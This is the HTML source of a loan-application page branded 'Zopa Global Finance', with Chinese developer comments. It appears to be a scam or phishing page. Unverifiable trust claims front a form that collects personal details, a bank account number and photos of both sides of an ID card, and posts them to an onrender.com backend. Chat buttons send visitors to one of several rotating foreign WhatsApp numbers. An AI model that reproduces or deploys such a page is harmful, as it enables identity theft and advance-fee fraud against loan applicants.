<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Zopa Global Finance</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    /* 中部客服按钮 - 基础样式 */
    .customer-service-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      background: linear-gradient(135deg, #25d366, #128c4a);
      color: white;
      font-weight: 700;
      padding: 16px 36px;
      border-radius: 30px;
      text-decoration: none;
      box-shadow: 0 6px 14px rgba(37, 211, 102, 0.6);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      margin: 3rem auto;
      cursor: pointer;
      max-width: 320px;
      font-size: 1.3rem;
      user-select: none;
      border: 2.5px solid #1eb851;
      text-shadow: 0 1px 1px rgba(0,0,0,0.15);
    }
    .customer-service-link:hover {
      background: linear-gradient(135deg, #128c4a, #0f6e3a);
      box-shadow: 0 8px 18px rgba(18, 140, 74, 0.85);
      border-color: #0f6e3a;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }

    /* 中部客服按钮 - 电脑端适配 */
    @media (min-width: 768px) {
      .customer-service-link {
        max-width: 460px;
        font-size: 1.5rem;
        padding: 18px 48px;
      }
    }

    /* 中部客服按钮图标 */
    .customer-service-link svg {
      width: 26px;
      height: 26px;
      fill: white;
      filter: drop-shadow(0 0 1px rgba(0,0,0,0.2));
      flex-shrink: 0;
    }

    /* 底部固定客服容器 */
    .whatsapp-footer {
      position: fixed;
      bottom: 15px;
      right: 15px;
      background: #25d366;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      box-shadow: 0 4px 10px rgba(37, 211, 102, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      z-index: 1000;
      border: 2px solid #1eb851;
    }
    .whatsapp-footer:hover {
      background: #128c4a;
      box-shadow: 0 6px 14px rgba(18, 140, 74, 0.7);
      border-color: #0f6e3a;
    }
    .whatsapp-footer img {
      width: 32px;
      height: 32px;
      user-select: none;
      pointer-events: none;
      filter: drop-shadow(0 0 1px rgba(0,0,0,0.15));
    }
  </style>
</head>
<body>
  <header>
    <h1>Zopa Global Finance</h1>
    <p>Your Trusted Loan Partner Since 2005</p>
  </header>

  <section class="company-info">
    <h2>About Us</h2>
    <p>Founded in 2005, Zopa Global Finance has been offering secure, reliable, and accessible loans to individuals in over 20 countries. With over 500,000 satisfied customers and a 95% approval rate, we aim to make financial freedom a reality for everyone.</p>
  </section>

  <section class="advantages">
    <h2>Why Choose Us</h2>
    <ul>
      <li>✔️ Simple Application Process</li>
      <li>✔️ High Loan Limits</li>
      <li>✔️ Instant Identity Verification</li>
      <li>✔️ Upload ID, Passport or Driver's License</li>
    </ul>
  </section>

  <!-- 中部客服按钮 -->
  <section style="text-align:center;">
    <a href="#" id="middle-whatsapp-link" class="customer-service-link" target="_blank" rel="noopener noreferrer" aria-label="Chat with Customer Service">
      <!-- WhatsApp SVG图标 -->
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
        <path d="M20.52 3.48a11.89 11.89 0 0 0-16.83 0 11.89 11.89 0 0 0-3.5 8.44c0 2.11.55 4.15 1.6 5.97L2 22l4.22-1.15a11.87 11.87 0 0 0 5.98 1.6 11.89 11.89 0 0 0 8.44-3.5 11.89 11.89 0 0 0 0-16.87Zm-7.9 15.17a9.1 9.1 0 0 1-4.8-1.38l-.34-.2-3.14.86.84-3.06-.22-.35a9.11 9.11 0 1 1 7.66 4.12Zm4.44-6.23c-.2-.1-1.17-.58-1.36-.65-.18-.07-.31-.1-.44.1-.12.2-.47.64-.58.77-.1.12-.2.14-.38.05-.18-.1-.76-.28-1.44-.9-.53-.47-.89-1.05-1-.23-.02-.4-.05-.57-.05s-.44.06-.67.32c-.23.26-.87.85-.87 2.07s.89 2.4 1.02 2.57c.12.16 1.75 2.67 4.25 3.74.59.25 1.05.4 1.41.51.59.18 1.13.16 1.56.1.48-.07 1.47-.6 1.68-1.18.2-.59.2-1.1.14-1.18-.07-.08-.26-.12-.55-.21Z"/>
      </svg>
      Chat with Our Customer Service
    </a>
  </section>

  <section class="form-section">
    <h2>Apply for a Loan</h2>
    <form id="loan-form" enctype="multipart/form-data">
      <input type="text" name="name" placeholder="Full Name" required />
      <input type="date" name="dob" placeholder="Date of Birth" required />
      <input type="email" name="email" placeholder="Email" required />
      <input type="tel" name="phone" placeholder="Phone Number" required />
      <input type="text" name="country" placeholder="Country" required />
      <input type="text" name="city" placeholder="City" required />
      <input type="text" name="occupation" placeholder="Occupation" required />
      <input type="text" name="income" placeholder="Monthly Income" required />
      <input type="number" name="amount" placeholder="Loan Amount ($)" required />

      <label>Repayment Term:</label>
      <select name="repayment_term" required>
        <option value="12 months">12 Months</option>
        <option value="24 months">24 Months</option>
        <option value="36 months">36 Months</option>
      </select>

      <input type="text" name="loan_purpose" placeholder="Purpose of Loan" required />
      <input type="text" name="bank_account" placeholder="Recipient Bank Account Number" required />

      <label>ID Front:</label>
      <input type="file" name="id_front" accept="image/*" required onchange="previewImage(event, 'preview-front')" />
      <img id="preview-front" class="preview" />

      <label>ID Back:</label>
      <input type="file" name="id_back" accept="image/*" onchange="previewImage(event, 'preview-back')" />
      <img id="preview-back" class="preview" />

      <button type="submit">Submit</button>
      <p id="form-message" style="color: green; font-weight: bold; margin-top: 10px;"></p>
    </form>
  </section>

  <!-- 底部固定客服WhatsApp图标 -->
  <a href="#" id="footer-whatsapp-link" class="whatsapp-footer" target="_blank" rel="noopener noreferrer" aria-label="WhatsApp Customer Service">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon" />
  </a>

  <script>
    // 预览图片函数
    function previewImage(event, id) {
      const reader = new FileReader();
      reader.onload = function () {
        document.getElementById(id).src = reader.result;
      };
      reader.readAsDataURL(event.target.files[0]);
    }

    // 贷款表单提交代码
    document.getElementById("loan-form").addEventListener("submit", async function (e) {
      e.preventDefault();
      const form = e.target;
      const data = new FormData(form);

      const email = form.email.value;
      if (!email.includes('@')) {
        alert("Please enter a valid email address.");
        return;
      }

      try {
        const response = await fetch("https://loanbackend-yg11.onrender.com/submit", {
          method: "POST",
          body: data
        });

        if (response.ok) {
          document.getElementById("form-message").textContent =
            "Your loan request has been received. Your credit limit will be sent via email or SMS. Please check regularly!";
          form.reset();
          document.getElementById("preview-front").src = "";
          document.getElementById("preview-back").src = "";
        } else {
          const err = await response.json();
          alert("Submission failed: " + (err.message || "Unknown error"));
        }
      } catch (error) {
        alert("An error occurred. Please try again.");
        console.error("❌ Submission Error:", error);
      }
    });

    // 随机选择一个WhatsApp号码，两个按钮用同一个号码
    const whatsappNumbers = [
      "447828639782",
      "16162285485",
      "85268118977",
      "85257644707"
    ];
    const randomIndex = Math.floor(Math.random() * whatsappNumbers.length);
    const chosenNumber = whatsappNumbers[randomIndex];
    const whatsappLink = `https://wa.me/${chosenNumber}`;

    // 设置两个超链接地址一致
    document.getElementById("middle-whatsapp-link").href = whatsappLink;
    document.getElementById("footer-whatsapp-link").href = whatsappLink;
  </script>

  <script src="script.js"></script>
</body>
</html>
